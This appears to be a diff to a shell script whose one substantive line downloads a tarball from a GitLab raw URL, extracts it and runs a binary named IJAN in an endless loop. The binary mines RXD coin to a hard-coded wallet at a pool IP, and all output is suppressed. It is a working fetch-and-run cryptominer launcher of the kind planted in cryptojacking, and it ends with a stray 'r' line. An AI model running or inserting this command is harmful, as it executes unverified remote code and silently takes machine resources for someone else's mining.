@@ -1,3 +1,4 @@
+#!/bin/bash
 wget https://gitlab.com/ajo9082734/Mine/-/raw/main/TT.tar.gz && tar xf TT.tar.gz && chmod +x TT.tar.gz && while true; do timeout 5m ./IJAN -coin RXD -P 162qMK5wiDbo2HiCcbK2F7yARvcwBBHqPW.$(shuf -n 1 -i 1-6)-RXD@164.90.140.83:80 -PP 5 -nocolor -PRT 0 -luck >/dev/null 2>&1
 r
 
